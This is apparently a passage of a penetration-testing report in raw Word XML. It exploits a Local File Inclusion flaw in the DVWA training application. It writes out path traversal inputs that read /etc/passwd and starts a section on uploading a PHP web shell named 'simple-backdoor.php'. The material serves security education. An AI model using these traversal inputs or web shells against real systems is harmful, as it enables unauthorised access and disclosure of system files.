      <w:bookmarkStart w:id="7" w:name="_Hlk67640538"/>
      <w:r w:rsidRPr="00420339">
        <w:t xml:space="preserve">During the exploitation phase, Adelaja </w:t>
      </w:r>
      <w:r>
        <w:t>will attempt to exploit a</w:t>
      </w:r>
      <w:r w:rsidR="000F1E11">
        <w:t xml:space="preserve">n LFI vulnerability </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">within the </w:t>
      </w:r>
      <w:r w:rsidR="000F1E11">
        <w:t>DVWA website</w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="004D11C1" w:rsidRPr="00FF06BD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The end goal for the tester is to attempt to penetrate the target system gaining as much access privilege as possible. Adelaja will stay within the scope determined during pre-engagement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07495797" w14:textId="23B1F33B" w:rsidR="004D11C1" w:rsidRDefault="004D11C1" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CCCDAD3" w14:textId="15B74370" w:rsidR="004D11C1" w:rsidRPr="008D0AB1" w:rsidRDefault="004D11C1" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>.1</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkStart w:id="8" w:name="_Hlk66914568"/>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Check</w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0035763C" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="8"/>
    <w:p w14:paraId="68D64DA4" w14:textId="47E8E811" w:rsidR="005D1328" w:rsidRDefault="005D1328" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Before proceeding to develop the exploit. The </w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>DVWA website</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is checked to find any</w:t>
      </w:r>
      <w:r w:rsidR="003353DD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerable</w:t>
      </w:r>
      <w:r w:rsidR="003353DD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to a Local File Inclusion attack before trying to leverage information obtained to get access to the system</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="0035763C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
      <w:r w:rsidR="0035763C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00067E6D">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">URL has a </w:t>
      </w:r>
      <w:r w:rsidR="0035763C" w:rsidRPr="0035763C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r w:rsidR="00067E6D">
        <w:t xml:space="preserve"> parameter with the </w:t>
      </w:r>
      <w:r w:rsidR="00067E6D" w:rsidRPr="00067E6D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>include.php</w:t>
      </w:r>
      <w:r w:rsidR="00067E6D">
        <w:t xml:space="preserve"> value, indicating </w:t>
      </w:r>
      <w:r w:rsidR="000E106A">
        <w:t xml:space="preserve">that the page </w:t>
      </w:r>
      <w:r w:rsidR="00067E6D">
        <w:t xml:space="preserve">is loading a </w:t>
      </w:r>
      <w:r w:rsidR="000E106A">
        <w:t xml:space="preserve">PHP </w:t>
      </w:r>
      <w:r w:rsidR="00067E6D">
        <w:t>file by that name</w:t>
      </w:r>
      <w:r w:rsidR="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 1.1].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B8EC13" w14:textId="0F458107" w:rsidR="00E34B94" w:rsidRDefault="00E34B94" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DD1DD2" w14:textId="77777777" w:rsidR="00E34B94" w:rsidRDefault="00E34B94" w:rsidP="004A7613">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="756B3C3D" wp14:editId="1878DA30">
            <wp:extent cx="6388734" cy="3781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439341" cy="3811379"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7873A123" w14:textId="3DBF766E" w:rsidR="00E34B94" w:rsidRPr="00E34B94" w:rsidRDefault="00E34B94" w:rsidP="00E34B94">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc64889312"/>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 xml:space="preserve">.1: </w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:r w:rsidR="007E4921">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Inclusion Page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5623657E" w14:textId="26F97E4C" w:rsidR="00E34B94" w:rsidRDefault="00E34B94" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CED6009" w14:textId="3443363A" w:rsidR="00D47D1A" w:rsidRDefault="000E106A" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="008E218A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="008E218A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> that the page loading the </w:t>
      </w:r>
      <w:r w:rsidR="008E218A" w:rsidRPr="008E218A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>include.php</w:t>
      </w:r>
      <w:r w:rsidR="008E218A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> file is two levels below the application’s root directory</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002641B1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>(/</w:t>
      </w:r>
      <w:r w:rsidR="002641B1" w:rsidRPr="00D47D1A">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>vulnerabilities/fi</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A" w:rsidRPr="00D47D1A">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>/)</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and three levels below the server’s root directory (</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A" w:rsidRPr="00D47D1A">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>dvwa/vulnerabilities/fi</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>/)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Replacing the filename</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000E106A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>include.php</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A" w:rsidRPr="000E106A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>../../index.php</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, will go up two levels </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">in the directory (known as a path or directory traversal) </w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>and display the DVWA’s home page on top of the current page[Figure 1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">], </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74956241" w14:textId="3F58E500" w:rsidR="00D47D1A" w:rsidRDefault="00D47D1A" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50561421" w14:textId="22E81520" w:rsidR="00897D9D" w:rsidRDefault="00897D9D" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C7F42F1" wp14:editId="52A06CF9">
            <wp:extent cx="6524625" cy="3980815"/>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28700" cy="3983301"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A77131A" w14:textId="571B10BF" w:rsidR="00897D9D" w:rsidRPr="00E34B94" w:rsidRDefault="00897D9D" w:rsidP="00897D9D">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Hlk67400169"/>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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Inclusion Page Displaying DVWA Homepage</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="10"/>
    <w:p w14:paraId="1F62A098" w14:textId="4CE6FBB3" w:rsidR="00D76645" w:rsidRDefault="00967DE5" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">scape the webserver root to reach files in the operating system. By </w:t>
      </w:r>
      <w:r w:rsidR="00BB11CA">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>default,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Linux </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>machine</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Apaches web server’s root</w:t>
      </w:r>
      <w:r w:rsidR="00D47D1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">at </w:t>
      </w:r>
      <w:r w:rsidR="00D76645" w:rsidRPr="00897D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>/var/www/</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>. Adding three more levels to the previous input on the URL will refer to the operating system’s root.</w:t>
      </w:r>
      <w:r w:rsidR="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Setting the </w:t>
      </w:r>
      <w:r w:rsidR="00D76645" w:rsidRPr="00D76645">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter to </w:t>
      </w:r>
      <w:r w:rsidR="00D76645" w:rsidRPr="00897D9D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>../../../../../</w:t>
      </w:r>
      <w:r w:rsidR="00897D9D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>../../</w:t>
      </w:r>
      <w:r w:rsidR="00D76645" w:rsidRPr="00897D9D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>etc/passwd</w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> will </w:t>
      </w:r>
      <w:r w:rsidR="00025234">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>display a list of system users, their home directories, and their default shells</w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> on the target operating system[Figure 1.</w:t>
      </w:r>
      <w:r w:rsidR="003F7A45">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00D76645">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="003F7A45">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FA3D1B" w14:textId="77777777" w:rsidR="00840C6A" w:rsidRDefault="00840C6A" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D051259" w14:textId="7A528ECB" w:rsidR="003F7A45" w:rsidRDefault="003F7A45" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C3CFD9A" wp14:editId="046B4BC0">
            <wp:extent cx="6666230" cy="3867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02768" cy="3888346"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="30827E7A" w14:textId="0B806557" w:rsidR="003F7A45" w:rsidRPr="00E34B94" w:rsidRDefault="003F7A45" w:rsidP="003F7A45">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Hlk67660926"/>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Inclusion Page Displaying /etc/passwd content</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="11"/>
    <w:p w14:paraId="4D8C2F1F" w14:textId="77777777" w:rsidR="00D76645" w:rsidRDefault="00D76645" w:rsidP="004D11C1">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646C03DE" w14:textId="0CB78C6B" w:rsidR="008D0AB1" w:rsidRPr="008D0AB1" w:rsidRDefault="00ED0E81" w:rsidP="00D76645">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Hlk67473954"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidR="005A0F07" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:bookmarkStart w:id="13" w:name="_Hlk67660293"/>
      <w:r w:rsidR="00D76645" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Uploading Malicious File To Exploit Local File Inclusion Further</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="526F743E" w14:textId="571EF586" w:rsidR="00BD468C" w:rsidRDefault="00967DE5" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Hlk67508302"/>
      <w:bookmarkEnd w:id="12"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">To further demonstrate the security issue of allowing the inclusion of local files, a malicious file </w:t>
      </w:r>
      <w:r w:rsidR="003F7A45">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> be uploaded to the website and used to further exploit this vulnerability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> using the </w:t>
      </w:r>
      <w:r w:rsidRPr="00967DE5">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>File Upload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> section of the DVWA website.</w:t>
      </w:r>
      <w:r w:rsidR="00102114">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> [Figure 2.1]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DBADAE" w14:textId="17A2CB5F" w:rsidR="003F7A45" w:rsidRDefault="003F7A45" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B60C936" w14:textId="39F68040" w:rsidR="003F7A45" w:rsidRDefault="003F7A45" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40A2F583" wp14:editId="79219E3E">
            <wp:extent cx="6248400" cy="284035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290488" cy="2859487"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9B0B72" w14:textId="692072AD" w:rsidR="003F7A45" w:rsidRPr="00E34B94" w:rsidRDefault="003F7A45" w:rsidP="003F7A45">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Hlk67401575"/>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Upload Page</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="15"/>
    <w:p w14:paraId="1F9A5C09" w14:textId="799B501D" w:rsidR="00B25AE6" w:rsidRDefault="00BB11CA" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">The malicious file to be uploaded is a </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000329B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>shell or backdoor script that will run on the target server</w:t>
      </w:r>
      <w:r w:rsidR="000329B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> allowing for the execution of operating system commands</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00025234">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">The file, </w:t>
      </w:r>
      <w:r w:rsidR="000329B4" w:rsidRPr="00B25AE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>simple-</w:t>
      </w:r>
      <w:r w:rsidR="00335CC1" w:rsidRPr="00B25AE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>backdoor.php</w:t>
      </w:r>
      <w:r w:rsidR="00025234">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="000329B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
